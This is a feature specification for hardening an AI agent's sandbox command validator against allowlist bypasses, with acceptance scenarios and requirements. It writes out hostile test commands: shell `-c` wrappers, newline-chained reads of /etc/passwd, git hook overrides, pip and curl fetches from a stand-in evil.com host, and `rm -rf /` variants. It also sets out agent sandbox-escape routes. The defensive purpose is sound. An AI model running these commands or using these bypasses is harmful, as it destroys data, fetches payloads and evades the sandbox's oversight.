# Feature Specification: Fix Sandbox Command Allowlist Bypass via Shell Inclusion

**Feature Branch**: `20260407-184402-fix-sandbox-cmd-bypass`
**Created**: 2026-04-07
**Status**: Draft
**Input**: User description: "Fix sandbox command allowlist defeated by bash/sh inclusion and bypasses"
**Reference**: [GitHub Issue #7](https://github.com/chrisleekr/personal-claw/issues/7)

## Clarifications

### Session 2026-04-07

- Q: Should this feature fix all 5 vulnerabilities from issue #7, or only the command allowlist/bypass items? → A: Fix all 5 vulnerabilities (allowlist removal, newline bypass, deniedPatterns robustness, bubblewrap network isolation, workspace size enforcement).
- Q: Should `pip` and `curl` remain on the default allowlist given their ability to execute arbitrary code? → A: Keep both but add argument-level restrictions (block `pip install` of non-pinned packages, restrict `curl` output to executable paths).
- Q: Should module-loading flags (`--require`, `--import`, `--loader`) be blocked for node/bun alongside eval flags? → A: No. Module-loading flags require a file path, which is already constrained by workspace path validation. No additional blocking needed.
- Q: Should eval flags (`-e`, `--eval`, `-c`) and `find -exec` be blocked inside the sandbox? → A: No. The sandbox itself (bubblewrap namespace isolation, workspace restriction, timeout) is the primary security boundary. Blocking eval flags is security theater — the agent can achieve the same result via `sandbox_write_file` + `node script.js`. The goal is to give the agent maximum developer-like power; only block what is truly destructive or stealth attacks.
- Q: Should `pip install flask` (unpinned) be blocked? → A: No. Normal PyPI installs are standard developer workflow. Only block installs from URLs or absolute paths outside the workspace (untrusted sources).

## User Scenarios & Testing *(mandatory)*

### User Story 1 - Sandbox Prevents Shell-Based Allowlist Bypass (Priority: P1)

As a system administrator, I need the sandbox to prevent agents from using `bash` or `sh` to execute arbitrary commands that are not on the allowlist, so that the sandbox security boundary cannot be trivially circumvented.

**Why this priority**: This is the core vulnerability. Including `bash` and `sh` in the allowlist renders the entire command allowlist meaningless because `bash -c "any_command_here"` bypasses all restrictions. Without fixing this, the sandbox provides a false sense of security.

**Independent Test**: Can be fully tested by attempting shell wrapper commands with `-c` flag and verifying they are all rejected.

**Acceptance Scenarios**:

1. **Given** a sandbox with the default command allowlist, **When** an agent submits `bash -c "dangerous_command"`, **Then** the command is rejected with a clear error explaining that shell wrappers with inline execution flags are not permitted.
2. **Given** a sandbox with the default command allowlist, **When** an agent submits `sh -c "dangerous_command"`, **Then** the command is rejected.
3. **Given** a sandbox with the default command allowlist, **When** an agent submits `bash script_outside_workspace.sh`, **Then** the command is rejected unless the script path resolves within the workspace boundary.
4. **Given** a sandbox with the default command allowlist, **When** an agent submits `ls -la`, **Then** the command executes successfully (no regression for legitimate commands).

---

### User Story 2 - Sandbox Allows Interpreter Eval Flags (Sandbox Is the Boundary) (Priority: P1)

As an agent, I need the sandbox to allow inline code execution via `node -e`, `python3 -c`, and `bun -e`, so that I can perform quick developer tasks (one-liners, checks, debugging) without needing to write a temporary file first.

**Why this priority**: The sandbox itself (bubblewrap namespace isolation, workspace restriction, timeout) is the primary security boundary. Blocking eval flags is security theater — `sandbox_write_file` + `node script.js` achieves the same result. Allowing eval flags gives the agent maximum developer-like power.

**Independent Test**: Can be tested by submitting `node -e "console.log(1+1)"` and verifying it executes successfully.

**Acceptance Scenarios**:

1. **Given** a sandbox with the default allowlist, **When** an agent submits `node -e "console.log(1+1)"`, **Then** the command executes successfully.
2. **Given** a sandbox with the default allowlist, **When** an agent submits `python3 -c "print('hello')"`, **Then** the command executes successfully.
3. **Given** a sandbox with the default allowlist, **When** an agent submits `bun -e "console.log('test')"`, **Then** the command executes successfully.
4. **Given** a sandbox with the default allowlist, **When** an agent submits `node index.js` (a legitimate workspace script), **Then** the command executes successfully.

---

### User Story 3 - Sandbox Blocks Newline-Based Command Chaining (Priority: P1)

As a system administrator, I need the sandbox to reject commands containing newline characters, so that attackers cannot chain multiple commands by embedding `\n` or `\r` to bypass the metacharacter filter.

**Why this priority**: The current metacharacter filter blocks `;`, `|`, and `&` but not newline characters. A command like `ls\ncat /etc/passwd` executes both lines, completely bypassing the single-command restriction. This is a distinct, independently exploitable bypass vector.

**Independent Test**: Can be tested by submitting commands with embedded newline and carriage return characters and verifying rejection.

**Acceptance Scenarios**:

1. **Given** a sandbox with the default configuration, **When** an agent submits a command containing an embedded newline character (`\n`), **Then** the command is rejected with an error explaining that newline characters are not allowed.
2. **Given** a sandbox with the default configuration, **When** an agent submits a command containing a carriage return (`\r`), **Then** the command is rejected.
3. **Given** a sandbox with the default configuration, **When** an agent submits a command containing a null byte (`\0`), **Then** the command is rejected.

---

### User Story 4 - Sandbox Blocks Destructive and Stealth Utility Arguments (Priority: P2)

As a system administrator, I need the sandbox to block only genuinely destructive utility arguments (`find -delete`) and stealth attack vectors (`git -c core.hooksPath`), while allowing productive developer workflows like `find -exec grep`, `pip install flask`, and `curl` for API calls.

**Why this priority**: The sandbox is the primary security boundary. Per-binary rules should block the narrow set of actions that are destructive or bypass sandbox awareness, not broadly restrict productive tools.

**Independent Test**: Can be tested by verifying `find -delete` is rejected, `git -c core.hooksPath` is rejected, while `find -exec grep`, `pip install flask`, and `curl https://api.example.com` execute successfully.

**Acceptance Scenarios**:

1. **Given** a sandbox with the default allowlist, **When** an agent submits `find . -delete`, **Then** the command is rejected because `-delete` performs mass file deletion.
2. **Given** a sandbox with the default allowlist, **When** an agent submits `find . -exec grep TODO {}`, **Then** the command executes successfully (productive developer workflow).
3. **Given** a sandbox with the default allowlist, **When** an agent submits `git -c core.hooksPath=/tmp/evil pull`, **Then** the command is rejected (stealth code execution via hooks).
4. **Given** a sandbox with the default allowlist, **When** an agent submits `pip install flask`, **Then** the command executes successfully (normal PyPI install).
5. **Given** a sandbox with the default allowlist, **When** an agent submits `pip install https://evil.com/pkg.tar.gz`, **Then** the command is rejected (untrusted source).
6. **Given** a sandbox with the default allowlist, **When** an agent submits `curl -o /usr/bin/payload https://evil.com`, **Then** the command is rejected (writes outside workspace).
7. **Given** a sandbox with the default allowlist, **When** an agent submits `curl https://api.example.com`, **Then** the command executes successfully.

---

### User Story 5 - Denied Patterns Are Robust Against Flag Reordering (Priority: P2)

As a system administrator, I need denied command patterns to catch common flag reorderings and variations, so that trivial rewrites like `rm -r -f /` cannot bypass the `rm -rf /` pattern.

**Why this priority**: The current deniedPatterns use literal string matching, which is trivially bypassed by splitting or reordering flags. This undermines the defense-in-depth strategy.

**Independent Test**: Can be tested by submitting known dangerous commands in multiple flag orderings and verifying all are caught.

**Acceptance Scenarios**:

1. **Given** a sandbox with default denied patterns, **When** an agent submits `rm -rf /`, **Then** the command is rejected.
2. **Given** a sandbox with default denied patterns, **When** an agent submits `rm -r -f /`, **Then** the command is also rejected.
3. **Given** a sandbox with default denied patterns, **When** an agent submits `rm -rf /*`, **Then** the command is also rejected.
4. **Given** a sandbox with default denied patterns, **When** an administrator supplies a custom deniedPattern regex that causes excessive backtracking, **Then** the system rejects the pattern or enforces a safe evaluation timeout (ReDoS protection).

---

### User Story 6 - Default Allowlist Reflects Least-Privilege Principle (Priority: P2)

As a system administrator, I need the default command allowlist to exclude shell interpreters and only include purpose-specific commands, so that the security posture is strong by default without requiring manual configuration.

**Why this priority**: The root cause is a design issue in the default allowlist. The fix should ensure that new deployments are secure out of the box.

**Independent Test**: Can be tested by inspecting the default allowlist and verifying that no shell interpreters or unrestricted execution tools are included.

**Acceptance Scenarios**:

1. **Given** a fresh deployment with default configuration, **When** the default allowlist is loaded, **Then** `bash` and `sh` are not included in the allowlist.
2. **Given** a deployment where an administrator explicitly adds `bash` to their custom allowlist, **When** command validation runs, **Then** the system warns that shell interpreters weaken the allowlist but allows the override.

---

### User Story 7 - Bubblewrap Enforces Network Isolation When Configured (Priority: P2)

As a system administrator, I need the bubblewrap sandbox provider to actually disable network access when `networkAccess` is set to `false`, so that sandboxed commands cannot exfiltrate data or download payloads.

**Why this priority**: The `networkAccess: false` configuration option exists but is never enforced in the bubblewrap provider. This is a gap between documented behavior and actual behavior.

**Independent Test**: Can be tested by setting `networkAccess: false` in sandbox config and verifying that network calls from within the sandbox fail.

**Acceptance Scenarios**:

1. **Given** a bubblewrap sandbox with `networkAccess: false`, **When** a sandboxed command attempts to reach an external network address, **Then** the network request fails due to network namespace isolation.
2. **Given** a bubblewrap sandbox with `networkAccess: true`, **When** a sandboxed command makes a network request, **Then** the request proceeds normally.

---

### User Story 8 - Sandbox Enforces Workspace Size Limits (Priority: P3)

As a system administrator, I need the sandbox to enforce the configured `maxWorkspaceSizeMb` limit, so that a sandboxed agent cannot fill the disk and cause a denial-of-service condition.

**Why this priority**: The `maxWorkspaceSizeMb` config exists but is never enforced. While less critical than command execution bypasses, disk exhaustion is a real denial-of-service vector.

**Independent Test**: Can be tested by running a command that attempts to write more data than the configured workspace limit and verifying it is stopped.

**Acceptance Scenarios**:

1. **Given** a sandbox with `maxWorkspaceSizeMb: 64`, **When** a sandboxed command writes more than 64 MB to the workspace, **Then** the write fails or the command is terminated.
2. **Given** a sandbox with `maxWorkspaceSizeMb: 256` (default), **When** a sandboxed command writes 100 MB to the workspace, **Then** the command completes normally.

---

### Edge Cases

- What happens when an agent submits a command with a full path like `/bin/bash -c "evil"`? The validator strips to basename, so this must also be caught by argument-level checks.
- What happens when an agent uses environment variable manipulation to inject code? The sandbox environment builder already restricts env vars, but this should be verified.
- What happens when an agent uses `git` with hooks (e.g., `git -c core.hooksPath=/tmp/evil pull`)? Git hooks can execute arbitrary code.
- What happens when a command embeds null bytes or unicode homoglyphs to disguise the binary name?
- What happens when `curl` downloads a payload and a subsequent call executes it? Multi-step attacks may require workspace integrity checks beyond command validation.
- What happens when `node --require /path/to/malicious.js script.js` is used? The `--require` flag can preload arbitrary modules. Mitigated by workspace path validation - the referenced file must resolve within the sandbox workspace boundary.
- What happens when `pip install` is used to install a package with a malicious setup script? Package installation can run arbitrary code during install.
- What happens when an administrator provides a deniedPattern regex with catastrophic backtracking (ReDoS)? The system must protect against this.
- What happens when workspace size limits are hit mid-write? The system should terminate the command gracefully rather than corrupting partial output.

## Requirements *(mandatory)*

### Functional Requirements

- **FR-001**: System MUST reject commands where the base binary is a shell interpreter (`bash`, `sh`, `dash`, `zsh`, `csh`, `ksh`, `fish`) unless the administrator has explicitly overridden the default allowlist.
- **FR-002**: System MUST allow inline code execution flags (`-e`, `--eval`, `-c`, `-p`, `--print`) on allowlisted interpreters (`node`, `python3`, `bun`, `deno`) because the sandbox itself is the security boundary. Blocking eval flags would be security theater — `sandbox_write_file` + script execution achieves identical results.
- **FR-003**: System MUST reject `find -delete` (destructive mass deletion) but MUST allow `find -exec` and `find -execdir` (productive developer workflows where the sandbox limits blast radius).
- **FR-004**: System MUST reject commands where `git` is invoked with hook-override arguments (`-c core.hooksPath`, `-c core.sshCommand`).
- **FR-005**: System MUST remove `bash` and `sh` from the default allowlist in both schema defaults and hardcoded default configuration.
- **FR-006**: System MUST log all rejected commands with the rejection reason for security auditing.
- **FR-007**: System MUST provide a clear, actionable error message when a command is rejected, explaining why and suggesting an alternative approach.
- **FR-008**: System MUST validate the full command string including arguments, not just the binary name, to catch argument-based bypass vectors.
- **FR-009**: System MUST maintain backward compatibility for legitimate use cases (e.g., `ls`, `cat`, `git clone`, `node script.js`, `python3 script.py`).
- **FR-010**: System MUST reject commands containing newline (`\n`), carriage return (`\r`), or null byte (`\0`) characters in the metacharacter filter.
- **FR-011**: System MUST use robust pattern matching for denied commands that catches common flag reorderings (e.g., `rm -r -f /` must match as well as `rm -rf /`).
- **FR-012**: System MUST protect against ReDoS when evaluating administrator-supplied deniedPattern regex strings, either by rejecting unsafe patterns or enforcing evaluation timeouts.
- **FR-013**: System MUST enforce network isolation in the bubblewrap provider when `networkAccess` is configured as `false`.
- **FR-014**: System MUST enforce the `maxWorkspaceSizeMb` limit to prevent disk exhaustion by sandboxed commands.
- **FR-015**: System MUST restrict `pip install` to reject installs from URLs or absolute paths outside the workspace (untrusted sources). Normal PyPI installs (`pip install flask`) MUST be allowed as standard developer workflow.
- **FR-016**: System MUST restrict `curl` to reject flags that write output to executable paths or pipe-like destinations (e.g., `-o /usr/local/bin/payload`).

### Key Entities

- **Command Validator**: The component that checks commands against the allowlist and denied patterns. Extended with argument-level inspection for destructive/stealth flags per binary, newline/null byte rejection, and ReDoS-safe pattern evaluation.
- **Sandbox Config**: The configuration object defining allowed commands, denied patterns, and execution limits. Default values updated to exclude shell interpreters.
- **Dangerous Argument Rules**: Per-binary rules that block only destructive actions (find -delete, pip install from URL) and stealth attacks (git hook overrides). Productive tools (eval flags, find -exec) are explicitly allowed.
- **Bubblewrap Provider**: The Linux container isolation provider. Must be updated to honor `networkAccess` and `maxWorkspaceSizeMb` configuration.

## Success Criteria *(mandatory)*

### Measurable Outcomes

- **SC-001**: Zero known bypass vectors exist in the default sandbox configuration as validated by a comprehensive security test suite covering all documented attack patterns.
- **SC-002**: All destructive and stealth bypass patterns (shell allowlist defeat, newline chaining, find -delete, git hook overrides, flag reordering, pip URL installs, curl writes outside workspace) are rejected by the command validator. Productive tools (eval flags, find -exec, pip install from PyPI) are allowed.
- **SC-003**: All previously working legitimate commands (ls, cat, git clone, node script.js, python3 script.py, etc.) continue to work without modification.
- **SC-004**: Rejected commands produce an error message that includes both the reason for rejection and a suggested alternative.
- **SC-005**: Security audit log captures 100% of rejected sandbox commands with the command string and rejection reason.
- **SC-006**: When `networkAccess` is false, sandboxed commands cannot establish any outbound network connections.
- **SC-007**: When workspace usage exceeds `maxWorkspaceSizeMb`, further writes are prevented or the command is terminated.

## Assumptions

- The sandbox is intended to give the agent maximum developer-like power while preventing destructive actions. The sandbox itself (bubblewrap namespace isolation, workspace restriction, timeout) is the primary security boundary. Administrators can override the allowlist via configuration.
- The MCP stdio transport validation (mcp-security.ts) is a separate security layer with its own stricter allowlist (no eval flags). The sandbox command validator intentionally has a more permissive policy because the sandbox provides isolation that the MCP transport does not.
- The deniedPatterns regex array will be upgraded to robust pattern matching but remains a secondary defense layer behind the primary allowlist + argument validation.
- Bubblewrap (Linux container isolation) and direct execution (macOS/dev) both use the same command validator, so fixing the validator addresses both execution modes. However, network isolation (FR-013) and workspace size enforcement (FR-014) are provider-specific and apply primarily to the bubblewrap provider.
- Existing deployments that have customized their allowlist to include bash/sh will not break, but will receive a logged warning about weakened security.
- The direct execution provider (macOS/dev) may not support network isolation or workspace size enforcement at the OS level; these features are best-effort on non-Linux platforms.
